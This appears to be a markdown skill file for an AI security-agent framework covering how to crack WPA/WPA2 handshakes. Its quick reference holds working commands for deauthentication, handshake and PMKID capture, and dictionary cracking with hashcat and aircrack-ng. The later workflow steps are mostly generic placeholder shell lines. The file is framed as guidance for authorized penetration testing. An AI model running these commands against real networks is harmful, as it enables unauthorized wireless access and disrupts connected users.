<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
<!-- CIPHER is a trademark of defconxt. -->
---
name: cracking-wireless-handshakes
description: >-
  Crack captured WPA/WPA2 wireless handshakes using dictionary attacks, PMKID exploitation, and GPU acceleration.
domain: cybersecurity
subdomain: password-cracking
tags:
  - wireless
  - wpa2
  - handshake
  - pmkid
  - aircrack
version: "1.0"
author: defconxt
license: AGPL-3.0
metadata:
  mitre-attack: ["T1110.002"]
  cwe: ["CWE-916"]
  tools: ["aircrack-ng", "hashcat", "hcxpcapngtool", "hcxdumptool", "wifite"]
---

# Cracking Wireless Handshakes

## Overview

Crack captured WPA/WPA2 wireless handshakes using dictionary attacks, PMKID exploitation, and GPU acceleration.

## Prerequisites

| Tool / Requirement | Details |
|---|---|
| `aircrack-ng` | Security tooling |
| `hashcat` | Security tooling |
| `hcxpcapngtool` | Security tooling |
| `hcxdumptool` | Security tooling |
| `wifite` | Security tooling |
| Isolated lab environment for testing | Environment requirement |
| Authorization and signed Rules of Engagement (RoE) | Environment requirement |
| Relevant target samples or systems acquired through authorized channels | Environment requirement |

## Quick Reference

```bash
# Capture WPA2 handshake
airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon  # deauth

# Capture PMKID
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Convert to hashcat format
hcxpcapngtool -o hash.hc22000 capture.pcapng

# Crack with hashcat (mode 22000)
hashcat -m 22000 -a 0 hash.hc22000 rockyou.txt

# Crack with aircrack-ng
aircrack-ng -w rockyou.txt capture-01.cap
```

## Workflow

### Step 1: Preparation and Reconnaissance

```bash
# Identify target and gather initial intelligence
file ./target_sample
aircrack-ng --version 2>/dev/null || echo "Install aircrack-ng"

# Set up working directory
mkdir -p /tmp/cracking-wireless-handshakes/{output,logs,artifacts}
```

### Step 2: Primary Analysis

```bash
# Execute primary analysis with aircrack-ng
# Refer to Quick Reference above for detailed commands
echo "[*] Running Cracking Wireless Handshakes with aircrack-ng..."

# Log all operations
script -q /tmp/cracking-wireless-handshakes/logs/session.log
```

### Step 3: Deep Investigation

```bash
# Apply hashcat for secondary analysis
echo "[*] Deep investigation with hashcat..."

# Cross-reference findings
diff /tmp/cracking-wireless-handshakes/output/primary.json /tmp/cracking-wireless-handshakes/output/secondary.json
```

### Step 4: Documentation and Reporting

```bash
# Generate structured findings report
cat <<'EOF' > /tmp/cracking-wireless-handshakes/output/report.json
{
  "technique": "cracking-wireless-handshakes",
  "domain": "password-cracking",
  "tools_used": ["aircrack-ng", "hashcat"],
  "findings": [],
  "recommendations": []
}
EOF
```

## Verification

- [ ] Environment and tools verified and operational
- [ ] Target samples acquired through authorized channels
- [ ] Primary analysis completed with findings documented
- [ ] Secondary validation performed with independent tooling
- [ ] All artifacts preserved in structured output directory
- [ ] Detection opportunities documented for blue team

## References

- [MITRE ATT&CK T1110.002](https://attack.mitre.org/techniques/T1110/002) — Related technique
- [aircrack-ng Documentation](https://aircrack-ng.org/) — Primary tooling
- [hashcat Reference](https://hashcat.org/) — Secondary tooling
